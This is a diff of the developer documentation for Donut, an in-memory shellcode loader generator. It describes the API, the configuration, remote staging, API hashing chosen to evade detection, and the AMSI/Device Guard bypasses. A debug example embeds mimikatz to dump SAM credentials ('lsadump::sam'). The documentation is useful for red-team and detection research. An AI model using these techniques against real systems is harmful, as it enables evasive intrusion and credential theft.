@@ -7,142 +7,24 @@
 
 <h2>Introduction</h2>
 
-<p>This document contains information about the Donut API and how to use them within your own application. Static and dynamic examples for Windows and Linux are shown.</p>
-
-<h2>Table of contents</h2>
+<p>This document contains information useful to developers that want to integrate Donut into their own project or write their own generator in a different language. Static and dynamic examples in C are provided for Windows and Linux. There's also information about the internals of the generator and loader such as data structures, the hash algorithm for resolving API, how bypassing AMSI and WLDP works, the symmetric encryption, debugging the generator and loader. Finally, there's also some information on how to extend functionality of the loader itself.</p>
 
 <ol>
   <li><a href="#api">Donut API</a></li>
   <li><a href="#config">Donut Configuration</a></li>
   <li><a href="#static">Static Example</a></li>
   <li><a href="#dynamic">Dynamic Example</a></li>
+  <li><a href="#com">Donut Components</a></li>
   <li><a href="#instance">Donut Instance</a></li>
   <li><a href="#module">Donut Module</a></li>
   <li><a href="#hashing">Win32 API Hashing</a></li>
   <li><a href="#encryption">Symmetric Encryption</a></li>
-  <li><a href="#bypass">Bypasses</a></li>
-  <li><a href="#debug">Debugging The Loader</a></li>
+  <li><a href="#bypass">Bypasses for AMSI/WLDP</a></li>
+  <li><a href="#debug">Debugging The Generator and Loader</a></li>
   <li><a href="#loader">Extending The Loader</a></li>
 </ol>
 
-<h3 id="com">Components</h3>
-
-<p>Donut contains the following elements:</p>
-
-<table>
-  <tr>
-    <th>File</th>
-    <th>Description</th>
-  </tr>
-  <tr>
-    <td>donut.c</td>
-    <td>Shellcode generator.</td>
-  </tr>
-  <tr>
-    <td>include/donut.h</td>
-    <td>C header file used by the generator.</td>
-  </tr>
-  <tr>
-    <td>lib/donut.dll and lib/donut.lib</td>
-    <td>Dynamic and static libraries for Microsoft Windows.</td>
-  </tr>
-  <tr>
-    <td>lib/donut.so and lib/donut.a</td>
-    <td>Dynamic and static libraries for Linux.</td>
-  </tr>
-  <tr>
-    <td>lib/donut.h</td>
-    <td>C header file to be used for C/C++ based projects.</td>
-  </tr>
-  <tr>
-    <td>donutmodule.c</td>
-    <td>The CPython wrapper for Donut. Used by the Python module.</td>
-  </tr>
-  <tr>
-    <td>setup.py</td>
-    <td>The setup file for installing Donut as a Pip Python3 module.</td>
-  </tr>
-  <tr>
-    <td>hash.c</td>
-    <td>Maru hash function. Uses the Speck 64-bit block cipher with Davies-Meyer construction for API hashing.</td>
-  </tr>
-  <tr>
-    <td>encrypt.c</td>
-    <td>Chaskey block cipher for encrypting modules.</td>
-  </tr>
-  <tr>
-    <td>loader/loader.c</td>
-    <td>Main file for the shellcode.</td>
-  </tr>
-  <tr>
-    <td>loader/inmem_dotnet.c</td>
-    <td>In-Memory loader for .NET EXE/DLL assemblies.</td>
-  </tr>
-  <tr>
-    <td>loader/inmem_pe.c</td>
-    <td>In-Memory loader for EXE/DLL files.</td>
-  </tr>
-  <tr>
-    <td>loader/inmem_script.c</td>
-    <td>In-Memory loader for VBScript/JScript files.</td>
-  </tr>
-  <tr>
-    <td>loader/activescript.c</td>
-    <td>ActiveScriptSite interface required for in-memory execution of VBS/JS files.</td>
-  </tr>
-  <tr>
-    <td>loader/wscript.c</td>
-    <td>Supports a number of WScript methods that cscript/wscript support.</td>
-  </tr>
-  <tr>
-    <td>loader/depack.c</td>
-    <td>Supports unpacking of modules compressed with aPLib.</td>
-  </tr>
-  <tr>
-    <td>loader/bypass.c</td>
-    <td>Functions to bypass Anti-malware Scan Interface (AMSI) and Windows Local Device Policy (WLDP).</td>
-  </tr>
-  <tr>
-    <td>loader/http_client.c</td>
-    <td>Downloads a module from remote staging server into memory.</td>
-  </tr>
-  <tr>
-    <td>loader/peb.c</td>
-    <td>Used to resolve the address of DLL functions via Process Environment Block (PEB).</td>
-  </tr>
-  <tr>
-    <td>loader/clib.c</td>
-    <td>Replaces common C library functions like memcmp, memcpy and memset.</td>
-  </tr>
-  <tr>
-    <td>loader/getpc.c</td>
-    <td>Assembly code stub to return the value of the EIP register.</td>
-  </tr>
-  <tr>
-    <td>loader/inject.c</td>
-    <td>Simple process injector for Windows that can be used for testing the loader.</td>
-  </tr>
-  <tr>
-    <td>loader/runsc.c</td>
-    <td>Simple shellcode runner for Linux and Windows that can be used for testing the loader.</td>
-  </tr>
-  <tr>
-    <td>loader/exe2h/exe2h.c</td>
-    <td>Extracts the machine code from compiled loader and saves as array to C header and Go files.</td>
-  </tr>
-</table>
-
-
-
-<h3 id="plan">Project plan</h3>
-
-<ul>
-  <li>Create a donut.py generator that uses the same command-line parameters as donut.exe.</li>
-  <li>Add support for HTTP proxies.</li>
-  <li>Write a blog post on how to integrate donut into your tooling, debug it, customize it, and design loaders that work with it.</li>
-</ul>
-
-<h2 id="api">Donut API</h2>
+<h2 id="api">1. Donut API</h2>
 
 <p>Shared/dynamic and static libraries for both Windows and Linux provide access to three API.</p>
 
@@ -150,16 +32,18 @@
 
   <li><code>int DonutCreate(PDONUT_CONFIG)</code></li>
   <p>Builds the Donut shellcode/loader using settings stored in a <code>DONUT_CONFIG</code> structure.</p>
+  
   <li><code>int DonutDelete(PDONUT_CONFIG)</code></li>
   <p>Releases any resources allocated by a successful call to <code>DonutCreate</code>.</p>
+  
   <li><code>const char* DonutError(int error)</code></li>
   <p>Returns a description for an error code returned by <code>DonutCreate</code>.</p>
 
 </ol>
 
-<p>The Donut project already contains a generator in C. <a href="https://twitter.com/nixbyte">nixbyte</a> has written <a href="https://github.com/n1xbyte/donutCS">a generator in C#</a>. awgh has written <a href="https://github.com/Binject/go-donut/">a generator in Go</a> and <a href="https://twitter.com/byt3bl33d3r">byt3bl33d3r</a> has written a Python module.</p>
+<p>The Donut project already contains a generator in C. <a href="https://twitter.com/nixbyte">nixbyte</a> has written <a href="https://github.com/n1xbyte/donutCS">a generator in C#</a>. awgh has written <a href="https://github.com/Binject/go-donut/">a generator in Go</a> and <a href="https://twitter.com/byt3bl33d3r">byt3bl33d3r</a> has written a Python module already included with the source.</p>
 
-<h2 id="config">Donut Configuration</h2>
+<h2 id="config">2. Donut Configuration</h2>
 
 <p>The minimum configuration required to build a shellcode is a path to a VBS/JS/EXE/DLL file that will be executed in-memory. If the file is a .NET DLL, a namespace and method are required. If the module will be stored on a staging server, a URL is required. The following structure is declared in donut.h and should be zero initialized prior to setting any member.</p>
 
@@ -333,7 +217,7 @@
   </tr>
 </table>
 
-<h2 id="static">Static Example</h2>
+<h2 id="static">3. Static Example</h2>
 
 <p>The following is linked with the static library donut.lib on Windows or donut.a on Linux.</p>
 
@@ -380,7 +264,7 @@
 <span style='color:#800080; '>}</span>
 </pre>
 
-<h2 id="dynamic">Dynamic Example</h2>
+<h2 id="dynamic">4. Dynamic Example</h2>
 
 <p>This example requires access to donut.dll on Windows or donut.so on Linux.</p>
 
@@ -468,11 +352,118 @@
 
 <p>Everything that follows concerns internal workings of Donut and is not required knowledge to generate the shellcode/loader.</p>
 
-<h2 id="instance">Donut Instance</h2>
+<h2 id="com">5. Donut Components</h2>
 
-<p>The position-independent code will always contain an <var>Instance</var> which can be viewed simply as a configuration for the code itself. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, if encryption is enabled, it will decrypt the data before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>. The data will be decompressed if required and only then is it loaded into memory for execution.</p>
+<p>The following table lists the name of each file and what it's used for.</p>
 
-<h2 id="module">Donut Module</h2>
+<table border="1">
+  <tr>
+    <th>File</th>
+    <th>Description</th>
+  </tr>
+  <tr>
+    <td>donut.c</td>
+    <td>Main file for the shellcode generator.</td>
+  </tr>
+  <tr>
+    <td>include/donut.h</td>
+    <td>C header file used by the generator.</td>
+  </tr>
+  <tr>
+    <td>lib/donut.dll and lib/donut.lib</td>
+    <td>Dynamic and static libraries for Microsoft Windows.</td>
+  </tr>
+  <tr>
+    <td>lib/donut.so and lib/donut.a</td>
+    <td>Dynamic and static libraries for Linux.</td>
+  </tr>
+  <tr>
+    <td>lib/donut.h</td>
+    <td>C header file to be used in C/C++ based projects.</td>
+  </tr>
+  <tr>
+    <td>donutmodule.c</td>
+    <td>The CPython wrapper for Donut. Used by the Python module.</td>
+  </tr>
+  <tr>
+    <td>setup.py</td>
+    <td>The setup file for installing Donut as a Pip Python3 module.</td>
+  </tr>
+  <tr>
+    <td>hash.c</td>
+    <td>Maru hash function. Uses the Speck 64-bit block cipher with Davies-Meyer construction for API hashing.</td>
+  </tr>
+  <tr>
+    <td>encrypt.c</td>
+    <td>Chaskey block cipher for encrypting modules.</td>
+  </tr>
+  <tr>
+    <td>loader/loader.c</td>
+    <td>Main file for the shellcode.</td>
+  </tr>
+  <tr>
+    <td>loader/inmem_dotnet.c</td>
+    <td>In-Memory loader for .NET EXE/DLL assemblies.</td>
+  </tr>
+  <tr>
+    <td>loader/inmem_pe.c</td>
+    <td>In-Memory loader for EXE/DLL files.</td>
+  </tr>
+  <tr>
+    <td>loader/inmem_script.c</td>
+    <td>In-Memory loader for VBScript/JScript files.</td>
+  </tr>
+  <tr>
+    <td>loader/activescript.c</td>
+    <td>ActiveScriptSite interface required for in-memory execution of VBS/JS files.</td>
+  </tr>
+  <tr>
+    <td>loader/wscript.c</td>
+    <td>Supports a number of WScript methods that cscript/wscript support.</td>
+  </tr>
+  <tr>
+    <td>loader/depack.c</td>
+    <td>Supports unpacking of modules compressed with aPLib.</td>
+  </tr>
+  <tr>
+    <td>loader/bypass.c</td>
+    <td>Functions to bypass Anti-malware Scan Interface (AMSI) and Windows Local Device Policy (WLDP).</td>
+  </tr>
+  <tr>
+    <td>loader/http_client.c</td>
+    <td>Downloads a module from remote staging server into memory.</td>
+  </tr>
+  <tr>
+    <td>loader/peb.c</td>
+    <td>Used to resolve the address of DLL functions via Process Environment Block (PEB).</td>
+  </tr>
+  <tr>
+    <td>loader/clib.c</td>
+    <td>Replaces common C library functions like memcmp, memcpy and memset.</td>
+  </tr>
+  <tr>
+    <td>loader/getpc.c</td>
+    <td>Assembly code stub to return the value of the EIP register.</td>
+  </tr>
+  <tr>
+    <td>loader/inject.c</td>
+    <td>Simple process injector for Windows that can be used for testing the loader.</td>
+  </tr>
+  <tr>
+    <td>loader/runsc.c</td>
+    <td>Simple shellcode runner for Linux and Windows that can be used for testing the loader.</td>
+  </tr>
+  <tr>
+    <td>loader/exe2h/exe2h.c</td>
+    <td>Extracts the machine code from compiled loader and saves as array to C header and Go files.</td>
+  </tr>
+</table>
+
+<h2 id="instance">6. Donut Instance</h2>
+
+<p>The loader will always contain an <var>Instance</var> which can be viewed simply as a configuration. It will contain all the data that would normally be stored on the stack or in the <code>.data</code> and <code>.rodata</code> sections of an executable. Once the main code executes, if encryption is enabled, it will decrypt the data before attempting to resolve the address of API functions. If successful, it will check if an executable file is embedded or must be downloaded from a remote staging server. To verify successful decryption of a module, a randomly generated string stored in the <code>sig</code> field is hashed using <var>Maru</var> and compared with the value of <code>mac</code>. The data will be decompressed if required and only then is it loaded into memory for execution.</p>
+
+<h2 id="module">7. Donut Module</h2>
 
 <p>Modules can be embedded in an <var>Instance</var> or stored on a remote HTTP server.</p>
 
@@ -498,11 +489,11 @@
 <span style='color:#800080; '>}</span> DONUT_MODULE<span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>PDONUT_MODULE<span style='color:#800080; '>;</span>
 </pre>
 
-<h2 id="hashing">Win32 API Hashing</h2>
+<h2 id="hashing">8. Win32 API Hashing</h2>
 
 <p>A hash function called <a href="https://github.com/odzhan/maru">Maru</a> is used to resolve the address of API at runtime. It uses a Davies-Meyer construction and the <a href="https://tinycrypt.wordpress.com/2017/01/11/asmcodes-speck/">SPECK</a> block cipher to derive a 64-bit hash from an API string. The padding is similar to what's used by MD4 and MD5 except only 32-bits of the string length are stored in the buffer instead of 64-bits. An initial value (IV) chosen randomly ensures the 64-bit API hashes are unique for each instance and cannot be used for detection of Donut. Future releases will likely support alternative methods of resolving address of API to decrease chance of detection.</p>
 
-<h2 id="encryption">Symmetric Encryption</h2>
+<h2 id="encryption">9. Symmetric Encryption</h2>
 
 <p>The following structure is used to hold a master key, counter and nonce for Donut, which are generated randomly.</p>
 
@@ -514,13 +505,13 @@
 
 <p><a href="https://tinycrypt.wordpress.com/2017/02/20/asmcodes-chaskey-cipher/">Chaskey</a>, a 128-bit block cipher with support for 128-bit keys, is used in Counter (CTR) mode to decrypt a <var>Module</var> or an <var>Instance</var> at runtime. If an adversary discovers a staging server, it should not be feasible for them to decrypt a donut module without the key which is stored in the donut loader. Future releases will support downloading a key via DNS and also asymmetric encryption.</p>
 
-<h2 id="bypasses">Bypasses</h2>
+<h2 id="bypass">10. Bypasses for AMSI/WLDP</h2>
 
-<p>Donut includes a bypass system for AMSI and other security features. Currently we bypass:</p>
+<p>Donut includes a bypass system for AMSI and WLDP. Currently we bypass:</p>
 
 <ul>
   <li>AMSI in .NET v4.8</li>
-  <li>Device Guard policy preventing dynamically generated code from executing</li>
+  <li>Device Guard policy preventing dynamically generated code from executing.</li>
 </ul>
 
 <p>You may customize our bypasses or add your own. The bypass logic is defined in loader/bypass.c. Each bypass implements the DisableAMSI fuction with the signature ```BOOL DisableAMSI(PDONUT_INSTANCE inst)```, and comes with a corresponding preprocessor directive. We have several ```#if defined``` blocks that check for definitions. Each block implements the same bypass function. For instance, our first bypass is called ```BYPASS_AMSI_A```. If donut is built with that variable defined, then that bypass will be used.</p>
@@ -531,7 +522,7 @@
 
 <p>If you wanted to, you could extend our bypass system to add in other pre-execution logic that runs before your .NET Assembly is loaded.</p>
 
-<h2 id="debug">Debugging The Loader</h2>
+<h2 id="debug">11. Debugging The Generator and Loader</h2>
 
 <p>The loader is capable of displaying detailed information about each step of file execution and can be useful in tracking down bugs. To build a debug-enabled executable, specify the debug label with nmake/make.</p>
 
@@ -540,118 +531,114 @@ nmake debug -f Makefile.msvc
 make debug -f Makefile.mingw
 </pre>
 
-<p>Use donut to create a shellcode as you normally would and a file called <code>instance</code> will be saved to disk.</p> 
+<p>Use donut to create a shellcode as you normally would and a file called <code>instance</code> will be saved to disk. The following example embeds mimikatz.exe in the loader using the Xpress Huffman compression algorithm. It also tells the loader to run the entrypoint as a thread, so that when mimikatz calls an exit-related API, it simply exits the thread. </p> 
 
 <pre>
-C:\hub\donut>donut mimikatz.exe -t -z5 -p"lsadump::sam exit"
+C:\hub\donut>donut -t -z5 mimikatz.exe -p"lsadump::sam exit"
 
   [ Donut shellcode generator v0.9.3
   [ Copyright (c) 2019 TheWover, Odzhan
 
-DEBUG: donut.c:964:DonutCreate(): Entering.
-DEBUG: donut.c:966:DonutCreate(): Validating configuration and path of file PDONUT_CONFIG: 000000BAC732EE30
-DEBUG: donut.c:982:DonutCreate(): Validating instance type 1
-DEBUG: donut.c:990:DonutCreate(): Validating format
-DEBUG: donut.c:995:DonutCreate(): Validating compression
-DEBUG: donut.c:1005:DonutCreate(): Validating entropy level
-DEBUG: donut.c:1045:DonutCreate(): Validating architecture
-DEBUG: donut.c:1055:DonutCreate(): Validating AMSI/WDLP bypass option
-DEBUG: donut.c:311:get_file_info(): Entering.
-DEBUG: donut.c:320:get_file_info(): Checking extension of mimikatz.exe
-DEBUG: donut.c:327:get_file_info(): Extension is ".exe"
-DEBUG: donut.c:343:get_file_info(): Module is EXE
-DEBUG: donut.c:355:get_file_info(): Mapping mimikatz.exe into memory
-DEBUG: donut.c:238:map_file(): Reading size of file : mimikatz.exe
-DEBUG: donut.c:247:map_file(): Opening mimikatz.exe
-DEBUG: donut.c:257:map_file(): Mapping 1013912 bytes for mimikatz.exe
-DEBUG: donut.c:364:get_file_info(): Checking DOS header
-DEBUG: donut.c:370:get_file_info(): Checking NT header
-DEBUG: donut.c:376:get_file_info(): Checking IMAGE_DATA_DIRECTORY
-DEBUG: donut.c:384:get_file_info(): Checking characteristics
-DEBUG: donut.c:464:get_file_info(): Reading fragment and workspace size
-DEBUG: donut.c:470:get_file_info(): workspace size : 1415999 | fragment size : 5161
-DEBUG: donut.c:473:get_file_info(): Allocating memory for compressed file
-DEBUG: donut.c:478:get_file_info(): Compressing with RtlCompressBuffer(XPRESS HUFFMAN)
-DEBUG: donut.c:517:get_file_info(): Original file size : 1013912 | Compressed : 478726
-DEBUG: donut.c:519:get_file_info(): File size reduced by 53%
-DEBUG: donut.c:525:get_file_info(): Leaving.
-DEBUG: donut.c:1076:DonutCreate(): Validating architecture 3 for DLL/EXE 2
-DEBUG: donut.c:1116:DonutCreate(): Creating module
-DEBUG: donut.c:635:CreateModule(): Entering.
-DEBUG: donut.c:642:CreateModule(): Allocating 480054 bytes of memory for DONUT_MODULE
-DEBUG: donut.c:718:CreateModule(): Setting the length of module data
-DEBUG: donut.c:722:CreateModule(): Copying data
-DEBUG: donut.c:735:CreateModule(): Leaving.
-DEBUG: donut.c:1123:DonutCreate(): Creating instance
-DEBUG: donut.c:746:CreateInstance(): Entering.
-DEBUG: donut.c:749:CreateInstance(): Allocating space for instance
-DEBUG: donut.c:756:CreateInstance(): The size of module is 480054 bytes. Adding to size of instance.
-DEBUG: donut.c:759:CreateInstance(): Total length of instance : 483718
-DEBUG: donut.c:771:CreateInstance(): Generating random key for instance
-DEBUG: donut.c:777:CreateInstance(): Generating random key for module
-DEBUG: donut.c:783:CreateInstance(): Generating random string to verify decryption
-DEBUG: donut.c:788:CreateInstance(): Generating random IV for Maru hash
-DEBUG: donut.c:794:CreateInstance(): Generating hashes for API using IV: 7F9CFD9E98CBBB71
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : LoadLibraryA           = 17355E8CFA7D19F2
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetProcAddress         = 8D3EBD1F34620889
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetModuleHandleA       = 5DB887782EF6CC37
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualAlloc           = BA9B4C4A6BEAF5EF
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualFree            = 9700D01C19AC3327
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualQuery           = F2A1D8F41B01A888
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : VirtualProtect         = 1B450EB228D7F4BF
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : Sleep                  = 309970892D16AE74
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : MultiByteToWideChar    = 28B0786855D4E4B7
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetUserDefaultLCID     = E2B11DFE6C1C9927
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : WaitForSingleObject    = 8E141DFA9123829C
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : CreateThread           = F619939835534A4E
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetThreadContext       = FF49CD4A23FC1A0A
-DEBUG: donut.c:807:CreateInstance(): Hash for kernel32.dll    : GetCurrentThread       = AFA0448721F19A48
-DEBUG: donut.c:807:CreateInstance(): Hash for shell32.dll     : CommandLineToArgvW     = B9E1AB2F97AF3B82
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreate        = 406E7F09F977003D
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = 90B641A7C06422B9
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayPutElement    = CDAA1210672A291B
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayDestroy       = DED07BF2F84740D5
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = 485237864F7642D7
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = 0B27A1EACACB8D54
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SysAllocString         = E2851380598F923E
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : SysFreeString          = 9710625B79B7C59E
-DEBUG: donut.c:807:CreateInstance(): Hash for oleaut32.dll    : LoadTypeLib            = 407E9567DBC5BC9C
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetCrackUrlA      = A1D4A6736A0EA4AF
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetOpenA          = C352FF2B2BB587A8
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetConnectA       = 92DB8FB2A2686001
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetSetOptionA     = 1DF489531305E2F2
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetReadFile       = BFBAFCB31E63825B
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : InternetCloseHandle    = 4B18A02CC85D989E
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : HttpOpenRequestA       = 160264D62A4DF1E2
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : HttpSendRequestA       = 5936CF89C3F15FC8
-DEBUG: donut.c:807:CreateInstance(): Hash for wininet.dll     : HttpQueryInfoA         = D4EEE57F477FE013
-DEBUG: donut.c:807:CreateInstance(): Hash for mscoree.dll     : CorBindToRuntime       = 45964B3A0790EA11
-DEBUG: donut.c:807:CreateInstance(): Hash for mscoree.dll     : CLRCreateInstance      = AF19DE2DFDDC387C
-DEBUG: donut.c:807:CreateInstance(): Hash for ole32.dll       : CoInitializeEx         = 3C74435194201CEE
-DEBUG: donut.c:807:CreateInstance(): Hash for ole32.dll       : CoCreateInstance       = AE07674E99604398
-DEBUG: donut.c:807:CreateInstance(): Hash for ole32.dll       : CoUninitialize         = 2CBC3DC7C51672C0
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlEqualUnicodeString  = 1BE848F01092C568
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlEqualString         = 843A12A6D6B48A52
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlUnicodeStringToAnsiString = 14183300DEDE2A3A
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlInitUnicodeString   = 2AA1F15AC21C5EFD
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlExitUserThread      = FAC1A2D55C0211EE
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlExitUserProcess     = 112E064D1CFB5E87
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlCreateUnicodeString = E59AF311C726FCC9
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlGetCompressionWorkSpaceSize = 2691D357A2E502D8
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : RtlDecompressBufferEx  = 66845AB3DD7E5961
-DEBUG: donut.c:807:CreateInstance(): Hash for ntdll.dll       : NtContinue             = FFBE44BEFC842282
-DEBUG: donut.c:933:CreateInstance(): Copying module data to instance
-DEBUG: donut.c:938:CreateInstance(): encrypting instance
-DEBUG: donut.c:950:CreateInstance(): Leaving.
-DEBUG: donut.c:1131:DonutCreate(): Saving instance to file
-DEBUG: donut.c:1164:DonutCreate(): PIC size : 504055
-DEBUG: donut.c:1171:DonutCreate(): Inserting opcodes
-DEBUG: donut.c:1207:DonutCreate(): Copying 20305 bytes of x86 + amd64 shellcode
-DEBUG: donut.c:1267:DonutCreate(): Saving loader as raw data
-DEBUG: donut.c:276:unmap_file(): Releasing compressed data
-DEBUG: donut.c:280:unmap_file(): Unmapping
-DEBUG: donut.c:283:unmap_file(): Closing
-DEBUG: donut.c:1306:DonutCreate(): Leaving.
+DEBUG: donut.c:1505:DonutCreate(): Entering.
+DEBUG: donut.c:1283:validate_loader_cfg(): Validating loader configuration.
+DEBUG: donut.c:1380:validate_loader_cfg(): Loader configuration passed validation.
+DEBUG: donut.c:459:read_file_info(): Entering.
+DEBUG: donut.c:467:read_file_info(): Checking extension of mimikatz.exe
+DEBUG: donut.c:475:read_file_info(): Extension is ".exe"
+DEBUG: donut.c:491:read_file_info(): File is EXE
+DEBUG: donut.c:503:read_file_info(): Mapping mimikatz.exe into memory
+DEBUG: donut.c:245:map_file(): Entering.
+DEBUG: donut.c:531:read_file_info(): Checking characteristics
+DEBUG: donut.c:582:read_file_info(): Leaving with error :  0
+DEBUG: donut.c:1446:validate_file_cfg(): Validating configuration for input file.
+DEBUG: donut.c:1488:validate_file_cfg(): Validation passed.
+DEBUG: donut.c:674:build_module(): Entering.
+DEBUG: donut.c:381:compress_file(): Reading fragment and workspace size
+DEBUG: donut.c:387:compress_file(): workspace size : 1415999 | fragment size : 5161
+DEBUG: donut.c:390:compress_file(): Allocating memory for compressed data.
+DEBUG: donut.c:396:compress_file(): Compressing 0000024E9D7E0000 to 0000024E9DA50080 with RtlCompressBuffer(XPRESS HUFFMAN)
+DEBUG: donut.c:433:compress_file(): Original file size : 1013912 | Compressed : 478726
+DEBUG: donut.c:434:compress_file(): File size reduced by 53%
+DEBUG: donut.c:436:compress_file(): Leaving with error :  0
+DEBUG: donut.c:684:build_module(): Assigning 478726 bytes of 0000024E9DA50080 to data
+DEBUG: donut.c:695:build_module(): Allocating 480054 bytes of memory for DONUT_MODULE
+DEBUG: donut.c:772:build_module(): Copying data to module
+DEBUG: donut.c:784:build_module(): Leaving with error :  0
+DEBUG: donut.c:804:build_instance(): Entering.
+DEBUG: donut.c:807:build_instance(): Allocating memory for instance
+DEBUG: donut.c:814:build_instance(): The size of module is 480054 bytes. Adding to size of instance.
+DEBUG: donut.c:817:build_instance(): Total length of instance : 483718
+DEBUG: donut.c:846:build_instance(): Generating random key for instance
+DEBUG: donut.c:855:build_instance(): Generating random key for module
+DEBUG: donut.c:864:build_instance(): Generating random string to verify decryption
+DEBUG: donut.c:871:build_instance(): Generating random IV for Maru hash
+DEBUG: donut.c:879:build_instance(): Generating hashes for API using IV: 546E2FF018FD2A54
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : LoadLibraryA           = ABB30FFE918BCF83
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetProcAddress         = EF2C0663C0CDDC21
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetModuleHandleA       = D40916771ECED480
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualAlloc           = E445DF6F06219E85
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualFree            = C6C992D6040B85A8
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualQuery           = 556BF46109D12C9E
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : VirtualProtect         = 032546126BB99713
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : Sleep                  = DEB476FF0E3D71E8
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : MultiByteToWideChar    = A0DD238846F064F4
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetUserDefaultLCID     = 03DE3865FC2DF17B
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : WaitForSingleObject    = 40FCB82879AAB610
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : CreateThread           = 954101E48C1D54F5
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetThreadContext       = 18669E0FDC3FD0B8
+DEBUG: donut.c:892:build_instance(): Hash for kernel32.dll    : GetCurrentThread       = EB6E7C47D574D9F9
+DEBUG: donut.c:892:build_instance(): Hash for shell32.dll     : CommandLineToArgvW     = EFD410EF534D57C3
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayCreate        = A5AA007611CB6580
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayCreateVector  = D5CEC16DD247A68A
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayPutElement    = 6B140B7B87F27359
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayDestroy       = C2FA65C58C68FC6C
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayGetLBound     = ED5A331176BB8DDA
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SafeArrayGetUBound     = EA0D8BE258DC67DA
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SysAllocString         = 3A7BBDEAA1DC3354
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : SysFreeString          = EEB92DFE18B7C306
+DEBUG: donut.c:892:build_instance(): Hash for oleaut32.dll    : LoadTypeLib            = 687DD816E578C4E7
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetCrackUrlA      = B0F95D86327741EC
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetOpenA          = BDD70375BB72B131
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetConnectA       = E74A4DD56C6B3154
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetSetOptionA     = 527C502C0BC36267
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetReadFile       = 055C3E8A4CF21475
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : InternetCloseHandle    = 4D1965E404D783BA
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : HttpOpenRequestA       = CC736E0143DB8F2A
+DEBUG: donut.c:892:build_instance(): Hash for wininet.dll     : HttpSendRequestA       = C87BFE8578BB0049
